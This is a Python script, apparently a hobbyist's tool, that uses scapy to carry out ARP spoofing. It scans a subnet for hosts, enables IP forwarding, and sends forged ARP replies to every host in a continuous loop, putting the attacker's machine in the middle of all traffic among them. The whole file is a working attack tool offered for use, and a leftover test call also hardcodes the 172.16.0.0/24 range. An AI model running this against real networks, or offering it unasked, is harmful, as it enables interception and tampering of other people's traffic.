import scapy.all as scapy 
import optparse
import time
class ARP_SPOOFER():
    def __init__(self):
        self.options = ""
        self.targets = ""
        self.arp_table = ""
        self.doer()
       
    def test(self):
        self.options = {"targets":["172.16.0.0/24"]}
        self.targets = self.options["targets"] 


    def doer(self) : 
        
        #coment this four lines when testing
        self.options = self.get_info()
        self.targets = self.options.target
        #if the user gives an address ip with / notation
        if "/" in self.targets : 
            pass
        else :
            self.targets = self.targets.split(",")
        self.portforward(self.options.pf)
        self.test()
        
        self.scanner()
        try : 
            self.spoofer()
        #when the user click ctrl + c , this code will work first
        except KeyboardInterrupt :
            print("\n [-] CTRL + C Detected .... Quitting  \n ")
            self.portforward(True,"0")
            print("\n [+] Made by : MOBO [+] \n ")


    def get_info(self):
        parser = optparse.OptionParser()
        # parser.add_option("-i","--interface",dest="interface",help="interface id")
        parser.add_option("-t","--target",dest="target",help="targets ip. example : '10.0.0.12,10.0.0.14,...'")
        parser.add_option("-p",dest="pf",help="set to True for port forwarding,False by default")
        options =  parser.parse_args()[0]

        error = self.error_check(options,parser)

        if not error :
            if not options.pf : 
                options.pf = False
            else : 
                options.pf = True
            return options


    def portforward(self,state,val="1"):
        if state : 
            with open("/proc/sys/net/ipv4/ip_forward","w") as file : 
                file.write(val)
        else : 
            pass

    def error_check(self,options,parser) : 
        exist = "/" in options.target 
        error = False
        if not options.target :
            error = True
            parser.error("you need to specify the targets. try --help ")
        elif not exist : 
            if not len(options.target.split(",")) > 1 :
                error = True
                parser.error("you need to specify more than 1 ip or a network address with / notation.")

        return error

    def scanner(self):
        #self.targets = [ "10.0.0.15", "10.0.0.20"] or "10.0.0.0/24"
        #we can give the scanner a network address with /prefix-length
        #and it will return all existing host and store them in the arp table 


        arp_table = []
        for t in self.targets :
            ## Making ARP REQUEST ##
            arp_request = scapy.ARP(pdst=t)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request = broadcast / arp_request
            ## Sending the ARP REQUEST ##
            answered = scapy.srp(arp_request,timeout=1,verbose=False)[0]
            for ans in answered : 
                arp_entry = {"ip":ans[1].psrc,"mac":ans[1].hwsrc}
                arp_table.append(arp_entry)

        ### will return a list of dictionary : 
        #[{...},{...},{...}]
        
        # {ip :"" , mac : ""}  
        self.arp_table = arp_table
        print(arp_table)


    def spoofer(self):
        i = 1
        #recursive list or something like that 
        #for each entry it will send a spoofing packet, for example if there is PC1,PC2,PC3,KALI
        # PC1 will get arp response telling him that KALI(src mac) is PC2 and PC3
        # PC2 will get arp response telling him that KALI(src mac) is PC1 and PC3
        # PC3 will arp response telling him that KALI(src mac) is PC1 and PC2

        while True : 
            for t in self.arp_table : 
                for f in self.arp_table : 
                    if t == f : 
                        continue
                    else :
                        arp_response = scapy.ARP(op=2,psrc=f["ip"],pdst=t["ip"],hwdst=t["mac"])
                        print(t["mac"])
                        scapy.send(arp_response,verbose=False)
                        print(f"\r [+] Packet sent : {i} ", end="")
                        i += 1
            time.sleep(2)

x = ARP_SPOOFER()





